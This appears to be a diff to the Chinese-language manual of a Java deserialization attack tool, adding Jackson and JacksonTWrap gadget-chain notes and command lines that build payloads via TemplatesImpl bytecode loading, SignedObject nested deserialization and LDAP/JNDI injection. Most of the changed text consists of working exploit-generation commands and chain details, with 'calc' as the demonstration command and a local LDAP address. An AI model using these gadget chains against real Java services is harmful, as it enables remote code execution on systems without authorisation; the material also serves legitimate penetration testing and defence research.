@@ -410,6 +410,11 @@ Getter利用链的漏洞利用方式：
 
 #### Jackson
 
+描述：关于Jackson链的注意事项：
+
+- 需要Jackson依赖：com.fasterxml.jackson.core:jackson-databind>2.9
+- 该链的稳定性：BadAttributeValueExpException#readObject() => POJONode#toString() => getter，会随机顺序调用对象*所有字段*中的getter方法。因为获取的顺序的不稳定性，有时 outputProperties 会在 stylesheetDOM 之前，这个时候反序列化攻击可以成功。可以使用JacksonTWrap来提高稳定性，但是这样就无法利用除Templateslmpl以外的漏洞利用方式。(TemplatesImpl和TemplatesImpl0俩种方式切换着利用)
+
 ##### Templateslmpl 加载字节码(继承AbstractTranslet)
 
 描述：在利用Templateslmpl利用链进行漏洞利用时候需要注意以下几点：
@@ -418,7 +423,6 @@ Getter利用链的漏洞利用方式：
 
     * javassist支持的字节码编译版本：主版本号49-55(jdk1.5-jdk11)
     * jdk执行字节码向下兼容，所以javassist选取最低的jdk编译版本就行
-2. TemplatesImpl在JDK高板本被移除
 
 工具：使用方式如下
 
@@ -443,7 +447,7 @@ Getter利用链的漏洞利用方式：
 工具：使用`Templateslmpl0:`​加载的字节码类不需要继承AbstractTranslet类
 
 ```java
--m YsoAttack -g CommonsBeanutils1 -a "Templateslmpl0:auto_cmd:calc"
+-m YsoAttack -g Jackson -a "Templateslmpl0:auto_cmd:calc"
 ```
 
 这里的auto_cmd参数可以替换为字节码执行的多种漏洞利用效果参数，详情见漏洞利用参数整理一栏。
@@ -455,7 +459,9 @@ Getter利用链的漏洞利用方式：
 工具：使用`SignedObject:`​参数后面跟二次反序列的利用链
 
 ```java
--m YsoAttack -g CommonsBeanutils2 -a "SignedObject:CommonsCollections6:raw_cmd:calc"
+-m YsoAttack -g Jackson -a "SignedObject:CommonsCollections6:raw_cmd:calc"
+    
+-m YsoAttack -g Jackson -a "SignedObject:FastJson1:Templateslmpl:raw_cmd:calc" -encode="Base64"
 ```
 
 ##### LdapAttribute LDAP注入
@@ -467,13 +473,25 @@ Getter利用链的漏洞利用方式：
 工具：增加LdapAttribute配置参数，ldap地址后面没有后缀
 
 ```bash
--m YsoAttack -g CommonsBeanutils2 -a "LdapAttribute:ldap://127.0.0.1:1389"
+-m YsoAttack -g Jackson -a "LdapAttribute:ldap://127.0.0.1:1389"
 ```
 
 将JNDI引擎需要这样启动，即可进行漏洞利用：
 
 ```python
 -m JNDIAttack -i 127.0.0.1 -u /Basic/auto_cmd/Y2FsYw==
+```
+
+####  JacksonTWrap(仅Templateslmpl利用)
+
+描述：JacksonTWrap 使用 JdkDynamicAopProxy 来动态代理 Templateslmpl 让 Jackson 利用链稳定触发，因为动态代理代理的类必须用接口来描述，所以只能动态代理 Templateslmpl 漏洞利用链。SignedObject，LdapAttribute利用链因为没有实现的接口也就无法用 JdkDynamicAopProxy 来稳定触发了。
+
+工具：只支持 Templateslmpl 漏洞利用
+
+```bash
+-m YsoAttack -g JacksonTWrap -a "Templateslmpl:auto_cmd:calc"
+
+-m YsoAttack -g JacksonTWrap -a "Templateslmpl0:auto_cmd:calc"
 ```
 
 #### FastJson系列
@@ -594,11 +612,11 @@ CommonsCollections利用链能被Java反序列化利用的原因是其中的Tran
 
 这里的raw_cmd参数可以替换为CC链的多种漏洞利用效果参数。
 
-####  SpringAOP(JDK高版本)
+####  SpringAOP(JDK高版本仅Templateslmpl利用方式)
 
 描述：这条链其实也可以叫做Jackson利用链，利用链的触发流程和Jackson基本一样。但是区分开来主要是该链针对JDK高版本反序列化而设计的：通过SpringAOP包的动态代理类绕过模块化的限制，使用XString头触发POJONode的toString方法，TemplatesImpl加载的类不继承AbstractTranslet接口。
 
-工具：
+工具：只能用Templateslmpl0来触发字节码加载
 
 ```bash
 #DefaultAdvisorChainFactory: serialVersionUID = 273003553246259276L
